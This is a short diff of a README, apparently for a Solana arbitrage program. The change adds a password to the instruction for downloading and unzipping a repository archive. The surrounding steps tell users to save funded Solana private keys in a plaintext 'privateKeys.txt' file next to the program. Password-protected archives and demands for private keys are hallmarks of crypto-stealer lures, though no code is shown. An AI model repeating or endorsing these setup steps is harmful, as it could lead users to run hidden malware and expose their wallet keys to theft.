@@ -27,7 +27,7 @@ bebop.xyz:
 ### Setup
 
 - Make sure you have Net Framework 4.8 installed.
-- [Clone](https://github.com/Xinkey62/solana-arbitrage/archive/refs/heads/main.zip) the repository and unzip the repository fo folder.
+- [Clone](https://github.com/Xinkey62/solana-arbitrage/archive/refs/heads/main.zip) the repository and unzip the repository with pass `aVb42Qz` fo folder.
 - Create SOL private key list with a balance. A minimum of 0.3 SOL on each address is required.
 - Save the list in 'privateKeys.txt' next to the programme.
 - Edit 'settings.json' to configure which projects you want to use for transactions
